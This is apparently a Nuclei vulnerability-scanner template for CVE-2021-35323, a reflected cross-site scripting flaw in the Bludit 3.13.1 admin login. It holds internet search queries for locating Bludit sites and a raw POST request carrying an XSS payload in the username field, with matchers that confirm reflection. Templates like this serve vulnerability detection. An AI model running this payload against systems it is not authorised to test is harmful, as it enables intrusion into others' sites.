id: CVE-2021-35323

info:
  name: Bludit 3.13.1 - Cross Site Scripting
  author: r3Y3r53
  severity: medium
  description: |
    Cross Site Scripting (XSS) vulnerability exists in bludit 3-13-1 via the username in admin/login
  remediation: Bludit v4.0.0
  reference:
    - https://github.com/bludit/bludit/issues/1327
    - https://nvd.nist.gov/vuln/detail/CVE-2021-35323
    - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-35323
    cwe-id: CWE-79
    epss-score: 0.03031
    epss-percentile: 0.86193
    cpe: cpe:2.3:a:bludit:bludit:3.13.1:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: bludit
    product: bludit
    shodan-query:
      - title:"Bludit"
      - http.title:"bludit"
    fofa-query: title="bludit"
    google-query: intitle:"bludit"
  tags: cve2021,cve,bludit,xss,vuln

http:
  - raw:
      - |
        GET /bludit/admin/login HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout: 10s
        POST /bludit/admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        tokenCSRF={{tokenCSRF}}&username=admin%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E&password=pass&save=

    host-redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains(content_type_2, "text/html")'
          - 'contains(body_2, "<img src=x onerror=alert(document.domain)>") && contains(body_2, "Bludit")'
        condition: and

    extractors:
      - type: regex
        name: tokenCSRF
        part: body
        group: 1
        regex:
          - 'type="hidden" id="jstokenCSRF" name="tokenCSRF" value="(.*)"'
        internal: true
# digest: 4b0a00483046022100a8e66397c3ae7d34b4d2076a878fc1e16e5cf137a8deca648e731c0488cd4faa022100d7f9055da71fac53a89453edccc6b9be2de3f2cc1ba96ccc0e7092617c6e2adb:922c64590222798bb761d5b6d8e72950